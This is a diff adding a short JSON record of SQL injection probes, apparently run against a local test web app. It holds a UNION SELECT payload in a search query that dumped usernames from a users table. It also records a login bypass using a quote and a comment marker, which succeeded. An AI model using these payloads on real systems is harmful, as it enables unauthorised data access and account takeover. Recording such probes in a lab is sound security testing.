@@ -1,0 +1,16 @@
+{
+  "request_normal": "GET /search?q=lamp",
+  "normal_status": 200,
+  "request_probe": "GET /search?q=zzz%' UNION SELECT id, username, 'x', 1.0, 1 FROM users --",
+  "probe_status": 200,
+  "usernames_returned_in_product_list": [
+    "admin",
+    "alice",
+    "bob"
+  ],
+  "login_with_quote_and_comment": {
+    "status": 302,
+    "location": "http://127.0.0.1:8080/"
+  },
+  "blocked": false
+}
